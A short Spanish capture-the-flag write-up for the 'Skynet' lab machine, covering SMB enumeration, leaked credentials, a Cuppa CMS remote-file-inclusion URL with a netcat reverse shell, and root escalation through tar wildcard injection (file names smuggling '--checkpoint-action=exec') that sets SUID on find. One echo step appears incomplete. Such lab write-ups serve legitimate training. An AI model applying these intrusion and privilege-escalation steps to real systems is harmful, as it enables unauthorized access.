# Skynet - rmartinez 18/01/2022

## Recon inicial

Vemos que tiene varios servicios:

- SSH en el 22
- Webserver en el 80
- Samba en el 445
- Pop3 en el 110
- IMAP en el 143

Hacemos dirsearch en el apache y no vemos nada relevante excepto un squirrelmail.
Vamos a enumerar samba, vemos que hay una share anonymous, nos bajamos los ficheros y vemos que hay credenciales en log1.txt.

Hacemos un smb-enum-users con nmap y vemos que hay un usuario llamado SKYNET\milesdyson.

Nos logueamos a continuación en squirrelmail con el usuario milesdyson y probamos la lista de credenciales, encontramos que la primera password es la correcta.

Al entrar en el mail obtenemos la password del samba:

```
)s{A&2Z=F^n_E.B`
```

Con la password de samba y el usuario enumerado anteriomente nos bajamos la unidad de milesdyson y vemos que tiene un fichero interesante important.txt, ahí vemos que hay un directorio oculto: 

```
/45kra24zxs28v3yd
```

Hacemos dirsearch sobre este directorio y vemos un directorio /administrator que tiene un Cuppa CMS. Buscamos en exploit-db una vulnerabilidad para este servicio y encontramos el exploit
25971, un RFI en la ruta:

```

10.10.193.24/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=<SHELL>

```

Generamos shell de pentestmonkey, abrimos netcat y obtenemos acceso a la máquina.

Enumerando la máquina vemos que haciendo un /etc/crontab vemos que root ejecuta un script backup.sh en /home/milesdyson/backup.sh, que hace un:

```
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Pues bien, esto es vulnerable a wildcards ya que se usa el parámetro *. Creamos dos ficheros en /var/www/html:

```
touch "--checkpoint-action=exec=sh test.sh"
touch "--checkpoint=1"
echo "chmod u+s /usr/bin/find"
```

Esperamos a que se ejecute el crontab y ya tenemos el binario find con permisos de root. Ejecutamos:

```
find . -exec /bin/sh \; -quit.
```

Y gg pwn3d.